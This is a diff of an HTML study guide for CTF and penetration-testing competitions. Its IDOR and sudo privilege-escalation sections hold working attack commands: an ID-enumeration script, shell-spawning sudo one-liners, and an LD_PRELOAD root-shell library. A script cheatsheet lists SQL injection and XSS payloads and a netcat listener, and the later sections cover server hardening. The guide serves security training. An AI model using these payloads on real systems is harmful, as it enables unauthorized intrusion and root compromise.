+wget --header="Cookie: session=abc123" http://target.com/download?file=2
+
+# Using Burp Suite
+# 1. Capture request
+# 2. Send to Repeater
+# 3. Change parameter values
+# 4. Check response differences</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 3: Automated Testing</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Bash Script for IDOR Testing</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre>#!/bin/bash
+# IDOR Scanner Script
+
+URL="http://target.com/api/user"
+COOKIE="session=abc123"
+RANGE_START=1
+RANGE_END=100
+
+echo "[*] Starting IDOR scan..."
+
+for i in $(seq $RANGE_START $RANGE_END); do
+    echo "[*] Testing ID: $i"
+    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: $COOKIE" "$URL/$i")
+    
+    if [ "$RESPONSE" == "200" ]; then
+        echo "[+] Found accessible resource: $URL/$i"
+        curl -s -H "Cookie: $COOKIE" "$URL/$i" | head -20
+        echo ""
+    elif [ "$RESPONSE" == "403" ]; then
+        echo "[-] Access denied: $i"
+    else
+        echo "[.] Response $RESPONSE for ID: $i"
+    fi
+    
+    sleep 0.5
+done
+
+echo "[*] Scan completed!"</pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- SUDO Privilege Escalation -->
+        <div class="content-section" id="sudo-privesc">
+            <div class="content-header">
+                <h1>🛡️ SUDO Privilege Escalation Master Guide</h1>
+                <p>Exploiting misconfigured sudo permissions to gain root access</p>
+            </div>
+            
+            <div class="alert alert-info">
+                <strong><i class="fas fa-lightbulb"></i> PRO TIP:</strong> Always check <a href="https://gtfobins.org" style="color: #88ccff; text-decoration: underline;">GTFOBins.org</a> for specific binary exploitation techniques!
+            </div>
+            
+            <div class="master-accordion open">
+                <div class="master-accordion-header">
+                    <div class="master-accordion-title">
+                        <span class="step-number">5.1</span>
+                        SUDO Enumeration & Exploitation
+                    </div>
+                    <i class="fas fa-chevron-down master-accordion-icon"></i>
+                </div>
+                <div class="master-accordion-content">
+                    <div class="master-accordion-body">
+                        <div class="step-card">
+                            <h5>Step 1: Check SUDO Permissions</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Enumeration Commands</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Check sudo permissions
+sudo -l
+sudo -l 2>/dev/null
+
+# Check for NOPASSWD
+sudo -l | grep NOPASSWD
+
+# Check sudoers file (if accessible)
+sudo cat /etc/sudoers
+sudo cat /etc/sudoers.d/*
+
+# Check recent sudo commands
+sudo grep sudo /var/log/auth.log | tail -20</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 2: Common Binary Exploitation</h5>
+                            <table class="table-container">
+                                <thead>
+                                    <tr>
+                                        <th>Binary</th>
+                                        <th>Exploit Command</th>
+                                        <th>Description</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>vim/vi</td>
+                                        <td><code>sudo vim -c ':!/bin/sh'</code></td>
+                                        <td>Spawn shell from vim</td>
+                                    </tr>
+                                    <tr>
+                                        <td>find</td>
+                                        <td><code>sudo find . -exec /bin/sh \; -quit</code></td>
+                                        <td>Execute shell via find</td>
+                                    </tr>
+                                    <tr>
+                                        <td>python</td>
+                                        <td><code>sudo python -c 'import os; os.system("/bin/sh")'</code></td>
+                                        <td>Python shell execution</td>
+                                    </tr>
+                                    <tr>
+                                        <td>perl</td>
+                                        <td><code>sudo perl -e 'exec "/bin/sh";'</code></td>
+                                        <td>Perl shell execution</td>
+                                    </tr>
+                                    <tr>
+                                        <td>awk</td>
+                                        <td><code>sudo awk 'BEGIN {system("/bin/sh")}'</code></td>
+                                        <td>AWK system call</td>
+                                    </tr>
+                                    <tr>
+                                        <td>less/more</td>
+                                        <td><code>sudo less /etc/passwd<br>!/bin/sh</code></td>
+                                        <td>Shell from pager</td>
+                                    </tr>
+                                    <tr>
+                                        <td>nmap</td>
+                                        <td><code>sudo nmap --interactive<br>nmap> !sh</code></td>
+                                        <td>Nmap interactive mode</td>
+                                    </tr>
+                                    <tr>
+                                        <td>tar</td>
+                                        <td><code>sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></td>
+                                        <td>Tar checkpoint exploit</td>
+                                    </tr>
+                                    <tr>
+                                        <td>git</td>
+                                        <td><code>sudo git -p help config<br>!/bin/sh</code></td>
+                                        <td>Git pager exploit</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 3: LD_PRELOAD Exploitation</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>LD_PRELOAD Method</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Check if LD_PRELOAD is allowed
+sudo -l | grep LD_PRELOAD
+
+# If allowed, create malicious library
+cat > /tmp/exploit.c << 'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+EOF
+
+# Compile the library
+gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
+
+# Execute with sudo
+sudo LD_PRELOAD=/tmp/exploit.so <command></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 4: Environment Variables Exploitation</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Other Environment Variables</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Check allowed environment variables
+sudo -l | grep -E "(SETENV|env_keep)"
+
+# If SETENV is allowed, exploit
+sudo PYTHONPATH=/tmp python
+# Create /tmp/os.py with malicious code
+
+# Bash function hijacking
+sudo BASH_FUNC_somefunction%%='() { id; }' bash -c 'somefunction'
+
+# Perl library path
+sudo PERL5LIB=/tmp perl
+# Create malicious Perl module in /tmp</pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Wordlists & Payloads -->
+        <div class="content-section" id="wordlists">
+            <div class="content-header">
+                <h1>📚 Wordlists & Payloads Collection</h1>
+                <p>Comprehensive collection of wordlists, payloads, and fuzzing dictionaries</p>
+            </div>
+            
+            <div class="master-accordion open">
+                <div class="master-accordion-header">
+                    <div class="master-accordion-title">
+                        <span class="step-number">7.1</span>
+                        Essential Wordlists Collection
+                    </div>
+                    <i class="fas fa-chevron-down master-accordion-icon"></i>
+                </div>
+                <div class="master-accordion-content">
+                    <div class="master-accordion-body">
+                        <div class="step-card">
+                            <h5>Top 10 Must-Have Wordlists</h5>
+                            <table class="table-container">
+                                <thead>
+                                    <tr>
+                                        <th>Wordlist</th>
+                                        <th>Purpose</th>
+                                        <th>Location/URL</th>
+                                        <th>Size</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>SecLists</td>
+                                        <td>General purpose</td>
+                                        <td>/usr/share/seclists</td>
+                                        <td>~700MB</td>
+                                    </tr>
+                                    <tr>
+                                        <td>rockyou.txt</td>
+                                        <td>Password cracking</td>
+                                        <td>/usr/share/wordlists/rockyou.txt</td>
+                                        <td>134MB</td>
+                                    </tr>
+                                    <tr>
+                                        <td>dirb common.txt</td>
+                                        <td>Directory brute-forcing</td>
+                                        <td>/usr/share/wordlists/dirb/common.txt</td>
+                                        <td>4.6KB</td>
+                                    </tr>
+                                    <tr>
+                                        <td>dirbuster directory-list</td>
+                                        <td>Directory enumeration</td>
+                                        <td>/usr/share/wordlists/dirbuster/*</td>
+                                        <td>Various</td>
+                                    </tr>
+                                    <tr>
+                                        <td>fasttrack.txt</td>
+                                        <td>Password attacks</td>
+                                        <td>/usr/share/wordlists/fasttrack.txt</td>
+                                        <td>2.5MB</td>
+                                    </tr>
+                                    <tr>
+                                        <td>subdomains-top1million</td>
+                                        <td>Subdomain enumeration</td>
+                                        <td>/usr/share/seclists/Discovery/DNS/</td>
+                                        <td>~10MB</td>
+                                    </tr>
+                                    <tr>
+                                        <td>fuzz.txt</td>
+                                        <td>Parameter fuzzing</td>
+                                        <td>/usr/share/seclists/Fuzzing/*</td>
+                                        <td>Various</td>
+                                    </tr>
+                                    <tr>
+                                        <td>XSS payloads</td>
+                                        <td>XSS testing</td>
+                                        <td>/usr/share/seclists/Fuzzing/XSS/*</td>
+                                        <td>~1MB</td>
+                                    </tr>
+                                    <tr>
+                                        <td>SQL injection</td>
+                                        <td>SQLi testing</td>
+                                        <td>/usr/share/seclists/Fuzzing/SQLi/*</td>
+                                        <td>~500KB</td>
+                                    </tr>
+                                    <tr>
+                                        <td>LFI payloads</td>
+                                        <td>LFI testing</td>
+                                        <td>/usr/share/seclists/Fuzzing/LFI/*</td>
+                                        <td>~200KB</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Custom Wordlist Generation</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Crunch Wordlist Generator</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Install crunch
+sudo apt install crunch
+
+# Generate numeric wordlist (0000-9999)
+crunch 4 4 0123456789 -o numbers.txt
+
+# Generate lowercase alphabet (aaaa-zzzz)
+crunch 4 4 abcdefghijklmnopqrstuvwxyz -o lowercase.txt
+
+# Generate alphanumeric (4 characters)
+crunch 4 4 abcdefghijklmnopqrstuvwxyz0123456789 -o alphanum.txt
+
+# Generate with pattern (company names)
+crunch 6 8 -t company%% -o company.txt
+
+# Generate from character set
+crunch 6 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o custom.txt
+
+# Combine multiple wordlists
+cat wordlist1.txt wordlist2.txt | sort -u > combined.txt</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Online Wordlist Resources</h5>
+                            <div class="reference-grid">
+                                <div class="reference-item">
+                                    <h6>SecLists GitHub</h6>
+                                    <a href="https://github.com/danielmiessler/SecLists" target="_blank">github.com/danielmiessler/SecLists</a>
+                                </div>
+                                <div class="reference-item">
+                                    <h6>PayloadsAllTheThings</h6>
+                                    <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">github.com/swisskyrepo/PayloadsAllTheThings</a>
+                                </div>
+                                <div class="reference-item">
+                                    <h6>FuzzDB</h6>
+                                    <a href="https://github.com/fuzzdb-project/fuzzdb" target="_blank">github.com/fuzzdb-project/fuzzdb</a>
+                                </div>
+                                <div class="reference-item">
+                                    <h6>Probable Wordlists</h6>
+                                    <a href="https://github.com/berzerk0/Probable-Wordlists" target="_blank">github.com/berzerk0/Probable-Wordlists</a>
+                                </div>
+                                <div class="reference-item">
+                                    <h6>assetnote.wordlists</h6>
+                                    <a href="https://wordlists.assetnote.io/" target="_blank">wordlists.assetnote.io</a>
+                                </div>
+                                <div class="reference-item">
+                                    <h6>raft wordlists</h6>
+                                    <a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/raft-large-files.txt" target="_blank">Raft Large Files</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Linux Hardening -->
+        <div class="content-section" id="linux-hardening">
+            <div class="content-header">
+                <h1>🛡️ Linux Server Hardening Guide</h1>
+                <p>Comprehensive security hardening for Linux servers</p>
+            </div>
+            
+            <div class="master-accordion open">
+                <div class="master-accordion-header">
+                    <div class="master-accordion-title">
+                        <span class="step-number">8.1</span>
+                        System Security Hardening
+                    </div>
+                    <i class="fas fa-chevron-down master-accordion-icon"></i>
+                </div>
+                <div class="master-accordion-content">
+                    <div class="master-accordion-body">
+                        <div class="step-card">
+                            <h5>Step 1: Update & Patch Management</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>System Updates</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Update package list
+sudo apt update
+
+# Upgrade packages
+sudo apt upgrade -y
+
+# Remove unnecessary packages
+sudo apt autoremove -y
+sudo apt autoclean
+
+# Check for security updates
+sudo unattended-upgrades --dry-run
+
+# Enable automatic security updates
+sudo dpkg-reconfigure --priority=low unattended-upgrades
+
+# Check kernel version
+uname -r
+# Always keep kernel updated</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 2: User Account Security</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>User Management</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Create new user with sudo
+sudo adduser username
+sudo usermod -aG sudo username
+
+# Remove default users
+sudo deluser --remove-home username
+
+# Set password policies
+sudo apt install libpam-pwquality
+sudo nano /etc/pam.d/common-password
+# Add: password requisite pam_pwquality.so retry=3 minlen=12 difok=3
+
+# Set password expiration
+sudo chage -M 90 username
+sudo chage -W 7 username
+sudo chage -I 30 username
+
+# Lock inactive accounts
+sudo useradd -D -f 30
+# 30 days after password expires, account is disabled
+
+# Check for empty passwords
+sudo awk -F: '($2 == "") {print $1}' /etc/shadow
+
+# Disable root login
+sudo passwd -l root</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 3: Filesystem Security</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Filesystem Hardening</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Set proper permissions
+sudo chmod 750 /home/username
+sudo chmod 600 /home/username/.ssh/authorized_keys
+sudo chmod 700 /home/username/.ssh
+
+# Find world-writable files
+sudo find / -type f -perm -0002 -exec ls -l {} \; 2>/dev/null
+
+# Find SUID/SGID files
+sudo find / -type f -perm /6000 -ls 2>/dev/null
+
+# Remove unnecessary SUID/SGID
+sudo chmod u-s /path/to/file
+sudo chmod g-s /path/to/file
+
+# Secure /tmp directory
+sudo nano /etc/fstab
+# Add: tmpfs /tmp tmpfs defaults,nosuid,nodev,noexec 0 0
+
+# Install and configure AIDE (file integrity checker)
+sudo apt install aide
+sudo aideinit
+sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 4: Network Security</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Network Hardening</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Configure firewall (UFW)
+sudo ufw default deny incoming
+sudo ufw default allow outgoing
+sudo ufw allow ssh
+sudo ufw allow http
+sudo ufw allow https
+sudo ufw enable
+
+# Check listening ports
+sudo netstat -tulpn
+sudo ss -tulpn
+
+# Disable IPv6 if not needed
+sudo nano /etc/sysctl.conf
+# Add:
+# net.ipv6.conf.all.disable_ipv6 = 1
+# net.ipv6.conf.default.disable_ipv6 = 1
+sudo sysctl -p
+
+# Configure TCP wrappers
+sudo nano /etc/hosts.allow
+# Add: sshd: 192.168.1.0/24
+
+sudo nano /etc/hosts.deny
+# Add: ALL: ALL
+
+# Install and configure fail2ban
+sudo apt install fail2ban
+sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
+sudo nano /etc/fail2ban/jail.local
+sudo systemctl enable fail2ban
+sudo systemctl start fail2ban</pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- SSH Hardening -->
+        <div class="content-section" id="ssh-hardening">
+            <div class="content-header">
+                <h1>🔐 SSH Server Hardening Guide</h1>
+                <p>Secure SSH configuration to prevent unauthorized access</p>
+            </div>
+            
+            <div class="master-accordion open">
+                <div class="master-accordion-header">
+                    <div class="master-accordion-title">
+                        <span class="step-number">8.2</span>
+                        SSH Security Configuration
+                    </div>
+                    <i class="fas fa-chevron-down master-accordion-icon"></i>
+                </div>
+                <div class="master-accordion-content">
+                    <div class="master-accordion-body">
+                        <div class="alert alert-warning">
+                            <strong><i class="fas fa-exclamation-circle"></i> IMPORTANT:</strong> Always keep a backup SSH connection open when testing new configurations!
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 1: Basic SSH Hardening</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>SSH Configuration (/etc/ssh/sshd_config)</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Backup original config
+sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
+
+# Edit SSH configuration
+sudo nano /etc/ssh/sshd_config
+
+# Change the following lines:
+
+# Disable root login
+PermitRootLogin no
+
+# Change SSH port (optional)
+Port 2222
+
+# Allow only specific users
+AllowUsers username1 username2
+
+# Allow only specific groups
+AllowGroups sshusers
+
+# Disable password authentication (use keys)
+PasswordAuthentication no
+
+# Enable public key authentication
+PubkeyAuthentication yes
+
+# Disable empty passwords
+PermitEmptyPasswords no
+
+# Disable X11 forwarding (unless needed)
+X11Forwarding no
+
+# Disable agent forwarding
+AllowAgentForwarding no
+
+# Disable TCP forwarding
+AllowTcpForwarding no
+
+# Set maximum authentication attempts
+MaxAuthTries 3
+
+# Set login grace time
+LoginGraceTime 30
+
+# Restart SSH service
+sudo systemctl restart sshd</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 2: SSH Key Authentication Setup</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>SSH Key Configuration</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># On client machine, generate SSH key
+ssh-keygen -t ed25519 -a 100
+# or
+ssh-keygen -t rsa -b 4096 -a 100
+
+# Copy public key to server
+ssh-copy-id -i ~/.ssh/id_ed25519.pub username@server_ip
+# or manually copy to server's ~/.ssh/authorized_keys
+
+# On server, secure the authorized_keys file
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+
+# Test SSH connection
+ssh -i ~/.ssh/id_ed25519 username@server_ip -p 2222
+
+# For extra security, add passphrase to key
+ssh-keygen -p -f ~/.ssh/id_ed25519</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 3: Advanced SSH Security</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Advanced Configuration</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Configure two-factor authentication (2FA)
+sudo apt install libpam-google-authenticator
+
+# Edit PAM configuration
+sudo nano /etc/pam.d/sshd
+# Add: auth required pam_google_authenticator.so
+
+# Edit SSH configuration
+sudo nano /etc/ssh/sshd_config
+# Add: ChallengeResponseAuthentication yes
+
+# Restart SSH
+sudo systemctl restart sshd
+
+# On user account, setup Google Authenticator
+google-authenticator
+
+# Set up fail2ban for SSH
+sudo nano /etc/fail2ban/jail.local
+# Add:
+[sshd]
+enabled = true
+port = ssh
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+bantime = 3600
+
+# Restart fail2ban
+sudo systemctl restart fail2ban
+
+# Monitor SSH logs
+sudo tail -f /var/log/auth.log | grep sshd
+
+# Check failed login attempts
+sudo grep "Failed password" /var/log/auth.log | wc -l</pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
         <div class="footer">
-            <p>🛡️ CTF & Penetration Testing Complete Guide - India Skills Compatible</p>
-            <p>For educational and authorized testing purposes only!</p>
-            <p>Made with 💚 for CTF enthusiasts | Always hack legally and ethically</p>
+            <p>🛡️ Ultimate CTF & Penetration Testing Guide | Version 3.0 | October 2023</p>
+            <p>For educational purposes only | Always obtain proper authorization | Practice legally and ethically</p>
+            <p>Made with 💚 for India Skills Cybersecurity Competitions</p>
         </div>
     </div>
 
     <script>
-        function switchTab(evt, tabName) {
-            const tabContents = document.getElementsByClassName('tab-content');
-            for (let i = 0; i < tabContents.length; i++) {
-                tabContents[i].classList.remove('active');
+        // Navigation functionality
+        document.addEventListener('DOMContentLoaded', function() {
+            // Handle sidebar navigation
+            const navItems = document.querySelectorAll('.nav-item');
+            const subNavItems = document.querySelectorAll('.sub-nav-item');
+            const contentSections = document.querySelectorAll('.content-section');
+            
+            // Function to activate section
+            function activateSection(sectionId) {
+                // Hide all sections
+                contentSections.forEach(section => {
+                    section.classList.remove('active');
+                });
+                
+                // Show selected section
+                const targetSection = document.getElementById(sectionId);
+                if (targetSection) {
+                    targetSection.classList.add('active');
+                    // Open all accordions in the section
+                    targetSection.querySelectorAll('.master-accordion').forEach(acc => {
+                        acc.classList.add('open');
+                    });
+                }
+                
+                // Update URL hash
+                window.location.hash = sectionId;
             }
-
-            const tabs = document.getElementsByClassName('nav-tab');
-            for (let i = 0; i < tabs.length; i++) {
-                tabs[i].classList.remove('active');
+            
+            // Handle main nav items
+            navItems.forEach(item => {
+                item.addEventListener('click', function() {
+                    const targetId = this.getAttribute('data-target');
+                    
+                    // Remove active class from all nav items
+                    navItems.forEach(nav => nav.classList.remove('active'));
+                    subNavItems.forEach(subNav => subNav.classList.remove('active'));
+                    
+                    // Add active class to clicked item
+                    this.classList.add('active');
+                    
+                    // Handle subnav toggle
+                    if (this.classList.contains('has-subnav')) {
+                        this.classList.toggle('active');
+                    } else {
+                        // Close all subnavs
+                        document.querySelectorAll('.sub-nav').forEach(subNav => {
+                            subNav.style.display = 'none';
+                        });
+                    }
+                    
+                    // Activate section if target exists
+                    if (targetId) {
+                        activateSection(targetId);
+                    }
+                });
+            });
+            
+            // Handle sub-nav items
+            subNavItems.forEach(item => {
+                item.addEventListener('click', function() {
+                    const targetId = this.getAttribute('data-target');
+                    
+                    // Remove active class from all sub-nav items
+                    subNavItems.forEach(subNav => subNav.classList.remove('active'));
+                    
+                    // Add active class to clicked item
+                    this.classList.add('active');
+                    
+                    // Activate section
+                    if (targetId) {
+                        activateSection(targetId);
+                    }
+                });
+            });
+            
+            // Handle master accordion toggle
+            const masterAccordionHeaders = document.querySelectorAll('.master-accordion-header');
+            
+            masterAccordionHeaders.forEach(header => {
+                header.addEventListener('click', function() {
+                    const accordion = this.parentElement;
+                    accordion.classList.toggle('open');
+                });
+            });
+            
+            // Handle nested accordion toggle
+            const nestedAccordionHeaders = document.querySelectorAll('.nested-accordion-header');
+            
+            nestedAccordionHeaders.forEach(header => {
+                header.addEventListener('click', function() {
+                    const accordion = this.parentElement;
+                    accordion.classList.toggle('open');
+                });
+            });
+            
+            // Check URL hash on page load
+            if (window.location.hash) {
+                const sectionId = window.location.hash.substring(1);
+                const targetItem = document.querySelector(`[data-target="${sectionId}"]`);
+                if (targetItem) {
+                    targetItem.click();
+                }
             }
-
-            document.getElementById(tabName).classList.add('active');
-            evt.currentTarget.classList.add('active');
+            
+            // Open first accordion in each section
+            document.querySelectorAll('.content-section.active .master-accordion').forEach((accordion, index) => {
+                if (index === 0) {
+                    accordion.classList.add('open');
+                }
+            });
+        });
+        
+        // Copy code function
+        function copyCode(button) {
+            const codeContent = button.closest('.code-container').querySelector('.code-content pre').textContent;
+            navigator.clipboard.writeText(codeContent).then(() => {
+                const originalText = button.textContent;
+                button.textContent = 'Copied!';
+                button.style.background = 'rgba(0, 255, 136, 0.3)';
+                setTimeout(() => {
+                    button.textContent = originalText;
+                    button.style.background = '';
+                }, 2000);
+            });
         }
+        
+        // Quick reference functions
+        function showCheatsheet() {
+            alert(`🎯 ULTIMATE CHEATSHEET
 
-        function toggleAccordion(element) {
-            const content = element.nextElementSibling;
-            element.classList.toggle('active');
-            content.classList.toggle('active');
+🔍 RECONNAISSANCE
+nmap -sV -sC -p- -A -T4 target.com
+gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
+ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
+
+💉 SQL INJECTION
+' OR '1'='1' -- 
+' UNION SELECT null,username,password FROM users -- 
+sqlmap -u "http://target.com?id=1" --dbs --batch
+
+⚡ XSS PAYLOADS
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+" onmouseover="alert('XSS')
+
+🔓 PRIVILEGE ESCALATION
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+cat /etc/crontab
+
+🛠️ USEFUL COMMANDS
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+nc -lvnp 4444
+curl http://target.com | grep -o "flag{.*}"
+strings binary | grep -i flag
+
+🌐 ESSENTIAL RESOURCES
+GTFOBins.org - Binary exploitation
+HackTricks.xyz - Pentesting wiki
+PayloadsAllTheThings - Payload collection
+CyberChef - Data manipulation`);
+        }
+        
+        function showPractice() {
+            alert(`🏆 PRACTICE PLATFORMS
+
+• HackTheBox (https://www.hackthebox.com/)
+• TryHackMe (https://tryhackme.com/)
+• PicoCTF (https://picoctf.org/)
+• OverTheWire (https://overthewire.org/wargames/)
+• VulnHub (https://www.vulnhub.com/)
+• PentesterLab (https://pentesterlab.com/)
+• CTFtime (https://ctftime.org/)
+• RootMe (https://www.root-me.org/)
+
+📚 LEARNING RESOURCES
+• GTFOBins (https://gtfobins.org/)
+• HackTricks (https://book.hacktricks.xyz/)
+• PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
+• OWASP (https://owasp.org/)
+• PortSwigger Academy (https://portswigger.net/web-security)
+
+🎯 INDIA SKILLS PREPARATION
+• Practice time management (30-45 min per challenge)
+• Document everything (commands, findings, methodology)
+• Focus on reconnaissance (40% of time)
+• Test on multiple platforms
+• Join CTF communities
+• Review previous competition challenges`);
         }
     </script>
 </body>
